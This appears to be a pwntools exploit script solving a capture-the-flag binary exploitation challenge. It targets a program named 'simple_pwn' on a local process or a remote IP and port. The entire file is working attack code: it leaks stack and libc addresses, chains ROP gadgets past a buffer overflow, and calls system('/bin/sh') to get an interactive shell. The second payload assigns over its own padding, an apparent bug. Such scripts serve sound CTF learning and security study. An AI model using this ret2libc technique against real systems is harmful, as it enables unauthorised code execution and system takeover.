from pwn import *

DEBUG = True
if DEBUG:
    p = process(['./simple_pwn'])
else:
    p = remote('3.35.102.104', 9696)
libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")
context.log_level = 'debug'

p.recvuntil(" : ")
stack_leak = int(p.recv(14), base=16)
stack_leak -= 0x28      # gets + 292
#system = stack_leak - 0x85ca680
#binsh = system + 0x164c1a

main = 0x400637
puts = 0x400510
poprdi = 0x400733

payload = 'A' * 0x88
payload += p64(poprdi)
payload += p64(stack_leak)
payload += p64(puts)
payload += p64(main)

p.recvline()
p.sendline(payload)

#p.recvline()
gets_addr = u64(p.recv(6)+"\x00\x00")
gets_addr -= 292
print(hex(gets_addr))

system_addr = gets_addr - libc.symbols["gets"] + libc.symbols["system"]
binsh_addr = gets_addr - libc.symbols["gets"] + libc.search("/bin/sh").next()

print("@@@@@@@@@@@@@@@@")
print(hex(system_addr))
print(hex(binsh_addr))

payload = 'A' * 0x80
payload = p64(poprdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.recvuntil(" : ")
p.recv(15)
p.sendline(payload)

p.interactive()
